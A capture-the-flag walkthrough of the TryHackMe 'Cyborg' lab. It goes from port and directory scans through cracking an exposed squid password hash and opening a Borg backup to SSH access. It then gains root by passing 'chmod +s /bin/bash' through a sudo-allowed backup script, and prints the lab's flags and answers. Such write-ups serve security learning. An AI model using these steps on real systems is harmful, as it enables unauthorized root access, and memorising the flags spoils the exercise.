# Cyborg

<br/>

### Task 1: Deploy the machine.

```
1. Deploy the machine
Ans: No Answer Needed

```

<hr/>

### Task 2: Compromise the System

```
# Nmap 7.91 scan initiated Fri Jul 30 23:00:01 2021 as: "C:\\Program Files\\Nmap\\nmap.exe" -sC -sV -T4 -oN nmap.txt 10.10.245.194
Nmap scan report for 10.10.245.194
Host is up (0.22s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul 30 23:00:25 2021 -- 1 IP address (1 host up) scanned in 25.56 seconds

1.  Scan the machine, how many ports are open?
Ans: 2

2. What service is running on port 22?
Ans: SSH

3. What service is running on port 80?
Ans: http

Lets Visit Website

```

![Default Webpage](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/TryHackMe/images/Startup/Picture-1.png "Default Webpage")

Lets Brute Force Directory.

```
## Gobuster Scan

/admin                (Status: 301) [Size: 312] [--> http://10.10.64.125/admin/]
/etc                  (Status: 301) [Size: 310] [--> http://10.10.64.125/etc/]

```

Lets Visit above Pages.

First Visit /etc Directory.
We have anothe directory named squid inside /etc directory.
http://10.10.64.125/etc/squid

![etc Directory](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/TryHackMe/images/Startup/Picture-2.png "etc Directory")

Now. Check /etc/squid/passwd file
We will use this password Later.
http://10.10.64.125/etc/squid/passwd

music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.

![Password File](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/TryHackMe/images/Startup/Picture-3.png "Password File")

```

Lets Visit /etc/squid/squid.conf file.

http://10.10.64.125/etc/squid/squid.conf

auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
auth_param basic children 5
auth_param basic realm Squid Basic Authentication
auth_param basic credentialsttl 2 hours
acl auth_users proxy_auth REQUIRED
http_access allow auth_users

```

![Config File](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/TryHackMe/images/Startup/Picture-4.png "Config File")

Now, Lets Visit /admin path.

![admin](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/TryHackMe/images/Startup/Picture-5.png "admin")

Now visit /admin/admin.html

![admin html](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/TryHackMe/images/Startup/Picture-6.png "admin html")

```

                http://10.10.64.125/admin/admin.html

                ############################################
                ############################################
                [Yesterday at 4.32pm from Josh]
                Are we all going to watch the football game at the weekend??
                ############################################
                ############################################
                [Yesterday at 4.33pm from Adam]
                Yeah Yeah mate absolutely hope they win!
                ############################################
                ############################################
                [Yesterday at 4.35pm from Josh]
                See you there then mate!
                ############################################
                ############################################
                [Today at 5.45am from Alex]
                Ok sorry guys i think i messed something up, uhh i was playing around with the squid proxy i mentioned earlier.
                I decided to give up like i always do ahahaha sorry about that.
                I heard these proxy things are supposed to make your website secure but i barely know how to use it so im probably making it more insecure in the process.
                Might pass it over to the IT guys but in the meantime all the config files are laying about.
                And since i dont know how it works im not sure how to delete them hope they don't contain any confidential information lol.
                other than that im pretty sure my backup "music_archive" is safe just to confirm.
                ############################################
                ############################################


Now Click on Archive Link We have another links in dropdown.
Listen and Download.

Lets Download Archive File and Extract it.
Now inside this folder we will receive Readme file.

Readme
This is a Borg Backup repository.
See https://borgbackup.readthedocs.io/

We have to extract this Repositoty using borg.

If you have install borg alredy extarct using it otherwise install borgbackup you will find installation process on above documentation link.

sudo apt install borgbackup -- Unix Based System.

We Required Password to Extract it, So Lets Crack Password which we have got in /etc/squid/passwd path.

root@ip-10-10-234-254:~/Desktop# john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
squidward (?)
1g 0:00:00:00 DONE (2021-08-01 06:17) 2.777g/s 108266p/s 108266c/s 108266C/s 112704..salsabila
Use the "--show" option to display all of the cracked passwords reliably
Session completed.


By Using this password extarct repositoty. We will get .txt file inside that Repositoy Which have credential of Alex.

Lets SSH Using this Credential
We Already Know that Port 22 Open (SSH Port)

root@ip-10-10-234-254:~# ssh alex@10.10.109.23
The authenticity of host '10.10.109.23 (10.10.109.23)' can't be established.
ECDSA key fingerprint is SHA256:uB5ulnLcQitH1NC30YfXJUbdLjQLRvGhDRUgCSAD7F8.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.109.23' (ECDSA) to the list of known hosts.
alex@10.10.109.23's password:
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.15.0-128-generic x86_64)

- Documentation: https://help.ubuntu.com
- Management: https://landscape.canonical.com
- Support: https://ubuntu.com/advantage

27 packages can be updated.
0 updates are security updates.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/\*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

alex@ubuntu:~$

alex@ubuntu:~$ ls -la
total 108
drwx------ 17 alex alex 4096 Dec 31 2020 .
drwxr-xr-x 3 root root 4096 Dec 30 2020 ..
-rw------- 1 alex alex 1145 Dec 31 2020 .bash_history
-rw-r--r-- 1 alex alex 220 Dec 30 2020 .bash_logout
-rw-r--r-- 1 alex alex 3771 Dec 30 2020 .bashrc
drwx------ 13 alex alex 4096 Jul 31 22:26 .cache
drwx------ 3 alex alex 4096 Dec 30 2020 .compiz
drwx------ 15 alex alex 4096 Dec 30 2020 .config
drwxr-xr-x 2 alex alex 4096 Dec 30 2020 Desktop
-rw-r--r-- 1 alex alex 25 Dec 30 2020 .dmrc
drwxr-xr-x 2 alex alex 4096 Dec 30 2020 Documents
drwxr-xr-x 2 alex alex 4096 Dec 31 2020 Downloads
drwx------ 2 alex alex 4096 Dec 30 2020 .gconf
drwx------ 3 alex alex 4096 Dec 31 2020 .gnupg
-rw------- 1 alex alex 1590 Dec 31 2020 .ICEauthority
drwx------ 3 alex alex 4096 Dec 30 2020 .local
drwx------ 5 alex alex 4096 Dec 30 2020 .mozilla
drwxr-xr-x 2 alex alex 4096 Dec 30 2020 Music
drwxr-xr-x 2 alex alex 4096 Dec 30 2020 Pictures
-rw-r--r-- 1 alex alex 655 Dec 30 2020 .profile
drwxr-xr-x 2 alex alex 4096 Dec 30 2020 Public
-rw-r--r-- 1 alex alex 0 Dec 30 2020 .sudo_as_admin_successful
drwxr-xr-x 2 alex alex 4096 Dec 30 2020 Templates
-r-xr--r-- 1 alex alex 40 Dec 30 2020 user.txt
drwxr-xr-x 2 alex alex 4096 Dec 30 2020 Videos
-rw------- 1 alex alex 51 Dec 31 2020 .Xauthority
-rw------- 1 alex alex 82 Dec 31 2020 .xsession-errors
-rw------- 1 alex alex 82 Dec 31 2020 .xsession-errors.old
alex@ubuntu:~$
alex@ubuntu:~$ cat user.txt
flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}

```

```
Root Privsec

alex@ubuntu:~$
alex@ubuntu:~$ sudo -l
Matching Defaults entries for alex on ubuntu:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
(ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
alex@ubuntu:~$ ls -la /etc/mp3backups/backup.sh
-r-xr-xr-- 1 alex alex 1083 Dec 30 2020 /etc/mp3backups/backup.sh
alex@ubuntu:~$ cat /etc/mp3backups/backup.sh
#!/bin/bash

sudo find / -name "\*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt

input="/etc/mp3backups/backed_up_files.txt"
#while IFS= read -r line
#do
#a="/etc/mp3backups/backed_up_files.txt"

# b=$(basename $input)

#echo

# echo "$line"

#done < "$input"

while getopts c: flag
do
case "${flag}" in
		c) command=${OPTARG};;
esac
done

backup_files="/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3"

# Where to backup to.

dest="/etc/mp3backups/"

# Create archive filename.

hostname=$(hostname -s)
archive_file="$hostname-scheduled.tgz"

# Print start status message.

echo "Backing up $backup_files to $dest/$archive_file"

echo

# Backup the files using tar.

tar czf $dest/$archive_file $backup_files

# Print end status message.

echo
echo "Backup finished"

cmd=$($command)
echo $cmd
alex@ubuntu:~$ nano /etc/mp3backups/backup.sh
alex@ubuntu:~$ sudo /etc/mp3backups/backup.sh -c "chmod +s /bin/bash"
/home/alex/Music/image12.mp3
/home/alex/Music/image7.mp3
/home/alex/Music/image1.mp3
/home/alex/Music/image10.mp3
/home/alex/Music/image5.mp3
/home/alex/Music/image4.mp3
/home/alex/Music/image3.mp3
/home/alex/Music/image6.mp3
/home/alex/Music/image8.mp3
/home/alex/Music/image9.mp3
/home/alex/Music/image11.mp3
/home/alex/Music/image2.mp3
find: \u2018/run/user/108/gvfs\u2019: Permission denied
Backing up /home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3 to /etc/mp3backups//ubuntu-scheduled.tgz

tar: Removing leading `/' from member names
tar: /home/alex/Music/song1.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song2.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song3.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song4.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song5.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song6.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song7.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song8.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song9.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song10.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song11.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song12.mp3: Cannot stat: No such file or directory
tar: Exiting with failure status due to previous errors

Backup finished

alex@ubuntu:~$ /bin/bash -p
bash-4.3# whoami
root
bash-4.3# ls -la
total 112
drwx------ 18 alex alex 4096 Jul 31 22:32 .
drwxr-xr-x 3 root root 4096 Dec 30 2020 ..
-rw------- 1 alex alex 1145 Dec 31 2020 .bash_history
-rw-r--r-- 1 alex alex 220 Dec 30 2020 .bash_logout
-rw-r--r-- 1 alex alex 3771 Dec 30 2020 .bashrc
drwx------ 13 alex alex 4096 Jul 31 22:26 .cache
drwx------ 3 alex alex 4096 Dec 30 2020 .compiz
drwx------ 15 alex alex 4096 Dec 30 2020 .config
drwxr-xr-x 2 alex alex 4096 Dec 30 2020 Desktop
-rw-r--r-- 1 alex alex 25 Dec 30 2020 .dmrc
drwxr-xr-x 2 alex alex 4096 Dec 30 2020 Documents
drwxr-xr-x 2 alex alex 4096 Dec 31 2020 Downloads
drwx------ 2 alex alex 4096 Dec 30 2020 .gconf
drwx------ 3 alex alex 4096 Dec 31 2020 .gnupg
-rw------- 1 alex alex 1590 Dec 31 2020 .ICEauthority
drwx------ 3 alex alex 4096 Dec 30 2020 .local
drwx------ 5 alex alex 4096 Dec 30 2020 .mozilla
drwxr-xr-x 2 alex alex 4096 Dec 30 2020 Music
drwxrwxr-x 2 alex alex 4096 Jul 31 22:32 .nano
drwxr-xr-x 2 alex alex 4096 Dec 30 2020 Pictures
-rw-r--r-- 1 alex alex 655 Dec 30 2020 .profile
drwxr-xr-x 2 alex alex 4096 Dec 30 2020 Public
-rw-r--r-- 1 alex alex 0 Dec 30 2020 .sudo_as_admin_successful
drwxr-xr-x 2 alex alex 4096 Dec 30 2020 Templates
-r-xr--r-- 1 alex alex 40 Dec 30 2020 user.txt
drwxr-xr-x 2 alex alex 4096 Dec 30 2020 Videos
-rw------- 1 alex alex 51 Dec 31 2020 .Xauthority
-rw------- 1 alex alex 82 Dec 31 2020 .xsession-errors
-rw------- 1 alex alex 82 Dec 31 2020 .xsession-errors.old
bash-4.3# cd /root
bash-4.3# ls
root.txt
bash-4.3# cat root.txt
flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
bash-4.3#

```
